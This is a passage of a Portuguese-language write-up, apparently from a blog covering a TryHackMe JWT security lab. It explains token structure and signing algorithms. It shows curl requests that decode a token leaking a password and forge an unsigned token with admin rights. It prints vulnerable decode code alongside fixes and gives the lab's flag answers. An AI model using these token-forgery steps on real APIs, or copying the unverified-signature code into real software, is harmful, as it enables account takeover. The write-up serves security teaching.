+    <a href="#what-is-the-common-header-used-to-transport-the-jwt-in-a-request" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h5><p>Para respondermos a pergunta acima, basta sabermos como é a estrutura de uma requisição JWT e qual é o seu cabeçalho.</p>
+<p>Resposta: <code>Authorization: Bearer header</code></p>
+<h2 data-hextra-search-id="json-web-tokens">JSON Web Tokens<span class="hx:absolute hx:-mt-20" id="json-web-tokens"></span>
+    <a href="#json-web-tokens" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>JWT é um padrão aberto, fornecendo informações para desenvolvedores ou criadores de bibliotecas que queiram usar JWTs, a sua estrutura segue da seguinte maneira.</p>
+<p><img src="/assets/img/posts/2025/01/JWT-SECURITY/JWT-SCTRUCTURE.webp" alt="Estrutura JWT"  loading="lazy" /></p>
+<h3 data-hextra-search-id="estrutura-jwt">Estrutura JWT<span class="hx:absolute hx:-mt-20" id="estrutura-jwt"></span>
+    <a href="#estrutura-jwt" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p><code>Header</code>:  indica qual é o tipo de token e qual algoritmo está sendo utilizado.</p>
+<p><code>Payload</code>: corpo do token, contém informações  de reinvindicações, as reinvindicações são pré-definidas como sendo públicas ou privadas pelo padrão JWT.</p>
+<p><code>Signature</code>: a parte do token que fornece o método que será utilizado para garantir a autenticidade do token.</p>
+<h3 data-hextra-search-id="algoritmos-de-assinatura">Algoritmos de assinatura<span class="hx:absolute hx:-mt-20" id="algoritmos-de-assinatura"></span>
+    <a href="#algoritmos-de-assinatura" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Existem diversos algoritmos de assinatura, abaixo será explicado os principais.</p>
+<p><code>None</code>: significa que nenhum algoritmo de assinatura será utilizado, desta forma, JWT não será capaz de verificar a autenticidade do token.</p>
+<p><code>Symmetric Signing</code>: algoritmo simétrico, como HS265, criam uma assinatura e anexando um valor secreto para o cabeçalho e payload do JWT antes de gerar um valor em hash. A verificação de assinatura, pode ser executada por qualquer sistema que tenha em posse o valor secreto.</p>
+<p><code>Asymmetric Signing</code>: algoritmo de assinatura assimétrica, como RS256, cria uma assinatura usando uma chave privada, para assinar o cabeçalho e o payload do JWT, é criado gerando uma hash e depois criptografando a hash com a chave privada. A verificação pode ser realizada por qualquer sistema que tenha a chave pública.</p>
+<h3 data-hextra-search-id="segurança-na-assinatura">Segurança na assinatura<span class="hx:absolute hx:-mt-20" id="segurança-na-assinatura"></span>
+    <a href="#seguran%c3%a7a-na-assinatura" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>JWTs podem ser criptografados (chamadas  de JWEs), mas o poder principal dos JWTs vem da assinatura. Uma vez que um JWT é assinado, ele pode ser enviado ao cliente, que pode usar este JWT sempre que necessário, realizando dessa maneira um servidor centralizado de autenticação que cria JWT para diversas aplicações.</p>
+<h3 data-hextra-search-id="perguntas-1">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas-1"></span>
+    <a href="#perguntas-1" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><h4 data-hextra-search-id="hs256-is-an-example-of-what-type-of-signing-algorithm">HS256 is an example of what type of signing algorithm?<span class="hx:absolute hx:-mt-20" id="hs256-is-an-example-of-what-type-of-signing-algorithm"></span>
+    <a href="#hs256-is-an-example-of-what-type-of-signing-algorithm" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>HS256 é utilizado para realizar assinaturas simétricas.</p>
+<p>Resposta: <code>Symmetric</code></p>
+<h4 data-hextra-search-id="rs256-is-an-example-of-what-type-of-signing-algorithm">RS256 is an example of what type of signing algorithm?<span class="hx:absolute hx:-mt-20" id="rs256-is-an-example-of-what-type-of-signing-algorithm"></span>
+    <a href="#rs256-is-an-example-of-what-type-of-signing-algorithm" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>RS256 é utilizado para realizar assinaturas assimétricas.</p>
+<p>Resposta: <code>Asymmetric</code></p>
+<h4 data-hextra-search-id="what-is-the-name-used-for-encrypted-jwts">What is the name used for encrypted JWTs?<span class="hx:absolute hx:-mt-20" id="what-is-the-name-used-for-encrypted-jwts"></span>
+    <a href="#what-is-the-name-used-for-encrypted-jwts" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>O nome é JWEs</p>
+<p>Resposta:<code>JWEs</code></p>
+<h2 data-hextra-search-id="divulgação-de-informações-confidenciais">Divulgação de informações confidenciais<span class="hx:absolute hx:-mt-20" id="divulgação-de-informações-confidenciais"></span>
+    <a href="#divulga%c3%a7%c3%a3o-de-informa%c3%a7%c3%b5es-confidenciais" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>O primeiro problema que iremos nos aprofundar é sobre a exposição de informações sensíveis dentro do JWT.</p>
+<p>Em um gerenciamento de sessão baseado em <code>cookie</code> as informações são armazenadas em parâmetros do lado servidor, esses valores não são expostos do lado do cliente e podem ser recuperados somente do lado do servidor. Entretanto com tokens, as reinvindicações são expostas em JWT no lado do cliente, alguns exemplos de informações que podem ser expostas.</p>
+<ul>
+<li>Credenciais como senhas em hash, ou ainda pior, em texto claro.</li>
+<li>Exposição da rede interna, como endereços de hosts, hostname e servidores de autenticação.</li>
+</ul>
+<h3 data-hextra-search-id="exemplo-1">Exemplo 1<span class="hx:absolute hx:-mt-20" id="exemplo-1"></span>
+    <a href="#exemplo-1" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> -X POST -d <span style="color:#e6db74">&#39;{ &#34;username&#34; : &#34;user&#34;, &#34;password&#34; : &#34;password1&#34; }&#39;</span> http://10.10.63.229/api/v1.0/example1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;token&#34;</span>: <span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3N3b3JkMSIsImFkbWluIjowLCJmbGFnIjoiVEhNezljYzAzOWNjLWQ4NWYtNDVkMS1hYzNiLTgxOGM4MzgzYTU2MH0ifQ.TkIH_A1zu1mu-zu6_9w_R4FUlYadkyjmXWyD5sqWd5U&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span> </span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Acima vemos a resposta da nossa requisição <code>POST</code> a API, nossa estrutura em JWT é montada, com caracter &ldquo;.&rdquo; sendo o delimitador de cada campo.</p>
+<p><code>header:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code></p>
+<p><code>Payload:eyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3N3b3JkMSIsImFkbWluIjowLCJmbGFnIjoiVEhNezljYzAzOWNjLWQ4NWYtNDVkMS1hYzNiLTgxOGM4MzgzYTU2MH0ifQ</code></p>
+<p><code>Signature: TkIH_A1zu1mu-zu6_9w_R4FUlYadkyjmXWyD5sqWd5U</code></p>
+<p>A decodificação do token pode ser realizada manualmente ou com ferramentas, na lição é fornecido a ferramenta <a
+    href="https://jwt.io/"target="_blank" rel="noopener">jwt io</a>.
+Outra solução, que podemos executar localmente, é a ferramenta <a
+    href="https://cyberchef.org/"target="_blank" rel="noopener">Cyber Chef</a></p>
+<p>Resultado da nossa decodificação.</p>
+<p><img src="/assets/img/posts/2025/01/JWT-SECURITY/JWT-IO.webp" alt="JWT-IO"  loading="lazy" /></p>
+<h3 data-hextra-search-id="erros-de-desenvolvimento">Erros de desenvolvimento<span class="hx:absolute hx:-mt-20" id="erros-de-desenvolvimento"></span>
+    <a href="#erros-de-desenvolvimento" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Exemplo de informações confidenciais sendo fornecidas após requisição.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> { 
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;username&#34;</span> : username, 
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;password&#34;</span> : password, 
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;admin&#34;</span> : <span style="color:#ae81ff">0</span>, 
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;flag&#34;</span> : <span style="color:#e6db74">&#34;[redacted]&#34;</span> 
+</span></span><span style="display:flex;"><span>	} 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>access_token <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>encode(payload, self<span style="color:#f92672">.</span>secret, algorithm<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HS256&#34;</span>)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h4 data-hextra-search-id="correção">Correção<span class="hx:absolute hx:-mt-20" id="correção"></span>
+    <a href="#corre%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Informações valiosas não podem ser adicionadas na resposta do JWT que será enviado para o lado do cliente, ao invés disso, esses valores devem ficar armazenados no lado do servidor, quando requisitados, o nome de usuário pode ser lido pelo JWT verificador , que realiza um lookup desses valores.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, self<span style="color:#f92672">.</span>secret, algorithms<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HS256&#34;</span>) 
+</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> payload[<span style="color:#e6db74">&#39;username&#39;</span>] 
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>db_lookup(username, <span style="color:#e6db74">&#34;flag&#34;</span>)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p><strong>payload = jwt.decode(token, self.secret, algorithms=&ldquo;HS256&rdquo;)</strong>:</p>
+<ul>
+<li>Decodifica o token JWT utilizando a chave secreta (<code>self.secret</code>) e o algoritmo HS256.</li>
+<li>O resultado da decodificação é um payload, que é um dicionário contendo as informações contidas no token.</li>
+</ul>
+<p><strong>username = payload[&lsquo;username&rsquo;]</strong>:</p>
+<ul>
+<li>Extrai o valor associado à chave &lsquo;username&rsquo; do payload. Esse valor é armazenado na variável <code>username</code>.</li>
+</ul>
+<p><strong>flag = self.db_lookup(username, &ldquo;flag&rdquo;)</strong>:</p>
+<ul>
+<li>Realiza uma busca na base de dados (<code>self.db_lookup</code>) utilizando o <code>username</code> e a chave &ldquo;flag&rdquo;.</li>
+<li>O resultado dessa busca é armazenado na variável <code>flag</code>.</li>
+</ul>
+<h3 data-hextra-search-id="pergunta">Pergunta<span class="hx:absolute hx:-mt-20" id="pergunta"></span>
+    <a href="#pergunta" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><h4 data-hextra-search-id="what-is-the-flag-for-example-1">What is the flag for example 1?<span class="hx:absolute hx:-mt-20" id="what-is-the-flag-for-example-1"></span>
+    <a href="#what-is-the-flag-for-example-1" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>A resposta foi encontrada quando realizamos a requisição e decodificamos o JWT.</p>
+<p>Resposta: <code>THM{9cc039cc-d85f-45d1-ac3b-818c8383a560}</code></p>
+<h2 data-hextra-search-id="erros-de-validação-de-assinatura">Erros de validação de assinatura<span class="hx:absolute hx:-mt-20" id="erros-de-validação-de-assinatura"></span>
+    <a href="#erros-de-valida%c3%a7%c3%a3o-de-assinatura" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><h3 data-hextra-search-id="assinaturas-que-não-são-verificadas">Assinaturas que não são verificadas<span class="hx:absolute hx:-mt-20" id="assinaturas-que-não-são-verificadas"></span>
+    <a href="#assinaturas-que-n%c3%a3o-s%c3%a3o-verificadas" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Quando assinatura JWT não é verificada pelo servidor o atacante pode alterar o JWT, dessa forma o atacante pode ser qualquer usuário que ele deseja.
+Embora a não validação de assinatura seja uma falha raríssima, ela pode ser encontrada em único endpoint, pouco utilizado ou esquecido na aplicação como sendo, por exemplo, uma aplicação descontinuada.</p>
+<h4 data-hextra-search-id="exemplo-2">Exemplo 2<span class="hx:absolute hx:-mt-20" id="exemplo-2"></span>
+    <a href="#exemplo-2" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Primeiro precisamos autenticar na aplicação.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> -X POST -d <span style="color:#e6db74">&#39;{ &#34;username&#34; : &#34;user&#34;, &#34;password&#34; : &#34;password2&#34; }&#39;</span> http://10.10.81.80/api/v1.0/example2
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;token&#34;</span>: <span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>É gerado nosso JWT, agora vamos verificar se nosso usuário está autenticado.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span> http://10.10.81.80/api/v1.0/example2?username<span style="color:#f92672">=</span>user
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Welcome user, you are not an admin&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Confirmado que estamos autenticado, já sabemos como é montada a estrutura do JWT, vamos remover nossa assinatura do JWT e ver como aplicação lida com isso.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.&#39;</span> <span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span> http://10.10.81.80/api/v1.0/example2?username<span style="color:#f92672">=</span>user
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Welcome user, you are not an admin&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Mesmo sem nossa assinatura permanecemos autenticados, isso demonstra que a API não realiza validação de assinatura. Agora iremos verificar se conseguimos alterar nosso usuário para <code>admin</code>.
+Primeiro iremos realizar o decodificação do nosso JWT.</p>
+<p><img src="/assets/img/posts/2025/01/JWT-SECURITY/JWT-example2-1.webp" alt="JWT EXAMPLE 2"  loading="lazy" /></p>
+<p>No payload do JWT iremos alterar para <code>1</code>, o valor do campo <code>admin</code>.</p>
+<p><img src="/assets/img/posts/2025/01/JWT-SECURITY/JWT-example2-2.webp" alt="JWT EXAMPLE 2-2"  loading="lazy" /></p>
+<p>Realizado a alteração, agora realizaremos uma nova requisição, para verificar se conseguimos alterar nosso usuário.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# 
+</span></span><span style="display:flex;"><span>curl -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.q8De2tfygNpldMvn581XHEbVzobCkoO1xXY4xRHcdJ8&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span> http://10.10.81.80/api/v1.0/example2?username<span style="color:#f92672">=</span>admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Welcome admin, you are an admin, here is your flag: THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Com isso validamos que a aplicação possui uma falha crítica, não é verificado assinaturas do JWT.</p>
+<h4 data-hextra-search-id="desenvolvimento-do-erro">Desenvolvimento do erro<span class="hx:absolute hx:-mt-20" id="desenvolvimento-do-erro"></span>
+    <a href="#desenvolvimento-do-erro" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>Exemplo abaixo mostra a falha de desenvolvimento para não verificar assinatura.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, options<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;verify_signature&#39;</span>: <span style="color:#66d9ef">False</span>})</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>Embora isso seja raro acontecer entre cliente e servidor, em aplicações entre servidores não é, um atacante com acesso direto ao backend do servidor poderia forjar um JWT facilmente.</p>
+<h4 data-hextra-search-id="correção-1">Correção<span class="hx:absolute hx:-mt-20" id="correção-1"></span>
+    <a href="#corre%c3%a7%c3%a3o-1" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p>O JWT sempre deve verificar assinatura e ou adicionar autenticação de dois fatores, JWT pode verificar fornecendo um chave secreta (ou pública), exemplo de código seguro.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> jwt<span style="color:#f92672">.</span>decode(token, self<span style="color:#f92672">.</span>secret, algorithms<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;HS256&#34;</span>)</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
